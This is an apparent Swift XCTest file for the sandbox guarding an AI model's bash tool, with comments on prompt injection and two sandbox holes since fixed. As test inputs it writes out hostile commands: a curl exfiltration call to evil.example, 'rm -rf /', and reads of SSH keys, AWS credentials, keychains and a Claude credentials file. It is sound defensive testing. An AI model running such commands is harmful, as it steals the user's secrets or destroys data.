@testable import Throttle
import XCTest

/// Sandbox tests for the AI's `bash` tool. Critical: a bug in the
/// allowlist or arg validation lets a prompt-injected response read
/// the user's SSH keys / credentials / keychain. We test the rejection
/// paths exhaustively; the "happy path" of a `git --version` call is
/// covered too as a smoke test.
final class BashSandboxTests: XCTestCase {

    // MARK: - Forbidden characters

    func test_run_rejectsPipe() {
        let out = BashSandbox.run(command: "ls | grep foo")
        XCTAssertTrue(out.hasPrefix("Error:"), "pipe must be rejected")
        XCTAssertTrue(out.contains("|"))
    }

    func test_run_rejectsRedirection() {
        let out = BashSandbox.run(command: "ls > /tmp/out")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    func test_run_rejectsCommandSubstitution() {
        let out = BashSandbox.run(command: "ls $(whoami)")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    func test_run_rejectsBacktickSubstitution() {
        let out = BashSandbox.run(command: "ls `whoami`")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    func test_run_rejectsAnd() {
        let out = BashSandbox.run(command: "ls && rm -rf /")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    func test_run_rejectsSemicolon() {
        let out = BashSandbox.run(command: "ls; rm foo")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    func test_run_rejectsBackslash() {
        let out = BashSandbox.run(command: "ls \\foo")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    // MARK: - Allowlist enforcement

    func test_run_rejectsCurl() {
        let out = BashSandbox.run(command: "curl https://evil.example/exfil")
        XCTAssertTrue(out.hasPrefix("Error:"))
        XCTAssertTrue(out.contains("not on the bash allowlist"))
    }

    func test_run_rejectsBashShell() {
        let out = BashSandbox.run(command: "bash -c \"echo hi\"")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    func test_run_rejectsRm() {
        let out = BashSandbox.run(command: "rm -rf /")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    func test_run_rejectsPython() {
        let out = BashSandbox.run(command: "python -c print(1)")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    // MARK: - Path deny list

    func test_run_rejectsArgUnderDotSSH() {
        let out = BashSandbox.run(command: "cat ~/.ssh/id_rsa")
        XCTAssertTrue(out.hasPrefix("Error:"))
        XCTAssertTrue(out.contains(".ssh"))
    }

    func test_run_rejectsArgUnderDotAWS() {
        let out = BashSandbox.run(command: "cat ~/.aws/credentials")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    func test_run_rejectsArgUnderKeychains() {
        let out = BashSandbox.run(command: "cat /Users/foo/Library/Keychains/login.keychain")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    func test_run_resolvesDotDotTraversal() {
        // `~/Documents/../.ssh` should normalize to `~/.ssh` and get
        // caught by the deny list.
        let out = BashSandbox.run(command: "cat ~/Documents/../.ssh/id_rsa")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    // MARK: - Empty / malformed

    func test_run_rejectsEmpty() {
        let out = BashSandbox.run(command: "")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    func test_run_rejectsWhitespaceOnly() {
        let out = BashSandbox.run(command: "    ")
        XCTAssertTrue(out.hasPrefix("Error:"))
    }

    // MARK: - Happy path smoke test

    func test_run_gitVersionSucceeds() {
        let out = BashSandbox.run(command: "git --version")
        // Should NOT start with "Error:" — git is on the allowlist and
        // `--version` is harmless.
        XCTAssertFalse(out.hasPrefix("Error:"), "expected git --version to succeed, got: \(out)")
        XCTAssertTrue(out.contains("git version"))
        XCTAssertTrue(out.contains("exit 0"))
    }

    /// `swift` and `xcodebuild` used to be on the allowlist, and this test
    /// asserted `swift --version` worked. They are arbitrary-code-execution
    /// engines: `swift build` compiles and RUNS `Package.swift` at manifest-load
    /// time, `xcodebuild` runs a project's Run Script phases. Either turns any
    /// cloned repository into a payload, which makes the file's own promise
    /// ("cannot exfiltrate", "cannot escalate to write") false. Refusing them is
    /// the fix; this test now guards the refusal.
    func test_run_codeExecutionEnginesAreRefused() {
        for command in ["swift --version", "swift build", "xcodebuild -list"] {
            let out = BashSandbox.run(command: command)
            XCTAssertTrue(out.hasPrefix("Error:"), "`\(command)` must be refused, got: \(out)")
        }
    }

    /// The deny-list only ran on arguments starting with `/`, `~`, `./` or
    /// `../`. The child's working directory is HOME, so a bare relative path
    /// reached the private key without ever being checked.
    func test_run_relativeCredentialPathIsRefused() {
        for command in [".ssh/id_rsa", ".aws/credentials", ".claude/.credentials.json"] {
            let out = BashSandbox.run(command: "cat \(command)")
            XCTAssertTrue(out.hasPrefix("Error:"),
                          "`cat \(command)` must be refused — cwd is HOME, got: \(out)")
        }
    }
}
